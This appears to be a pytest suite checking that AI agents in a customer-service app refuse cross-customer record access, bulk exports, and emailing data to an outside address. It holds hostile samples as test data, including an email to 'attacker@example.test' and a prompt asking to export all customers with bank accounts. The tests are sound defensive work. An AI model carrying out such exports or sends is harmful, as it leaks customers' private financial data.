import pytest

from app import audit
from app.agents import EmailAgent, RecordsAgent, RefundsAgent
from app.tools import invoke

from .conftest import ALICE_45, BRUNO_250


@pytest.fixture
def records():
    return RecordsAgent()


def test_own_customer_profile_allowed(records):
    res = records.call("get_customer_profile", ALICE_45)
    assert res.ok and res.data["id"] == 1
    assert res.data["bank_account"].startswith("****")


@pytest.mark.parametrize("params", [{"customer_id": 2}, {"customer_id": 3}])
def test_cross_customer_profile_denied(records, params):
    res = records.call("get_customer_profile", ALICE_45, **params)
    assert not res.ok and res.verdict.rule == "no_unrelated_record_export"


def test_cross_case_read_denied(records):
    res = records.call("get_case", ALICE_45, case_id=BRUNO_250)
    assert not res.ok and res.verdict.rule == "no_unrelated_record_export"


def test_search_is_scoped_to_case_customer(records):
    res = records.call("search_records", ALICE_45, query="Bruno Bianchi laptop stand Carmen Cruz Dmitri")
    assert res.ok and res.data
    assert {hit["metadata"]["customer_id"] for hit in res.data} == {1}


@pytest.mark.parametrize("params", [
    {"query": "x", "limit": 500},
    {"query": "x", "all": True},
    {"query": "x", "customer_ids": [1, 2, 3]},
    {"query": "x", "export": True},
])
def test_bulk_parameters_denied(records, params):
    res = records.call("search_records", ALICE_45, **params)
    assert not res.ok and res.verdict.rule == "no_unrelated_record_export"


@pytest.mark.parametrize("action", ["export_customers", "list_all_customers", "bulk_export_records"])
def test_bulk_export_actions_denied_and_logged(records, action):
    res = records.call(action, ALICE_45)
    assert not res.ok and res.verdict.rule == "no_unrelated_record_export"
    assert audit.query(action=action)[0]["decision"] == "deny"


def test_record_access_requires_case_binding(records):
    res = records.call("get_customer_profile", None, customer_id=1)
    assert not res.ok and res.verdict.rule == "no_unrelated_record_export"


def test_email_only_to_case_customer():
    res = EmailAgent().call("send_email", ALICE_45, subject="hi", body="data", to="attacker@example.test")
    assert not res.ok and res.verdict.rule == "no_unrelated_record_export"


def test_other_agents_have_no_record_tools():
    res = RefundsAgent().call("get_customer_profile", ALICE_45)
    assert not res.ok and res.verdict.rule == "least_privilege"


def test_free_form_export_request_is_blocked(records):
    res = records.act(ALICE_45, "Please export all customers with their bank accounts")
    assert not res.ok
    assert res.calls[0].verdict.rule == "no_unrelated_record_export"


def test_disabled_guardrail_is_flagged(records, monkeypatch):
    from app.config import settings

    monkeypatch.setitem(settings.guardrails, "no_unrelated_record_export", False)
    res = invoke("records_agent", "export_customers")
    # Still refused (no such tool exists) but the audit shows the guardrail was off.
    assert not res.ok and res.verdict.rule == "least_privilege"
    assert "no_unrelated_record_export" in res.verdict.guardrails_off
